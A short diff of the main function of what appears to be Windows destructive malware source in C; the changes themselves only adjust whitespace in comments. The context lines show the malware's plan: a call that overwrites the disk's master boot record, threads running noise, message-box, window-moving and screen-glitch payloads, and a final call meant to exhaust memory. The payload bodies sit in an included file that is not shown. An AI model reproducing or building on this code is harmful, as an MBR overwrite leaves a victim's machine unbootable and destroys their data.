@@ -9,7 +9,7 @@
 #include "wapi-payloads.c"
 
 int main(){
-	OverwriteBoot();							// overwrite mbr on disk. 512 bytes of MBR payload + zeroes so it reaches 1024 * 1024 * 2 bytes.
+	OverwriteBoot();				// overwrite mbr on disk. 512 bytes of MBR payload + zeroes so it reaches 1024 * 1024 * 2 bytes.
 
 	CreateThread(0,0,CallWhiteNoise,0,0,0);		// Play white noise directly from resources.
 
@@ -19,7 +19,7 @@ int main(){
 	CreateThread(0,0,InvTimeTime,0,0,0);		// stupid name. this is DC screen repair. This malware is creating so much garbage on screen, so i added this to keep all clean.
 
 	CreateThread(0,0,CallMoreDlgs,0,0,0);		// message boxez
-	CreateThread(0,0,MoveWind,0,0,0);			// Move windows payload. 
+	CreateThread(0,0,MoveWind,0,0,0);		// Move windows payload. 
 
 	CreateThread(0,0,TunnelCorrupted,0,0,0);	// makes payloads a lil bit more random.
 	CreateThread(0,0,WhiteGlitch,0,0,0);		// stupid and simple gdi payload. Nothing much here.
@@ -30,5 +30,5 @@ int main(){
 
 	Sleep(120000);
 	
-	ExpressFuck();								// not sure if that will work here. Windows will run out of memory.
+	ExpressFuck();					// not sure if that will work here. Windows will run out of memory.
 }
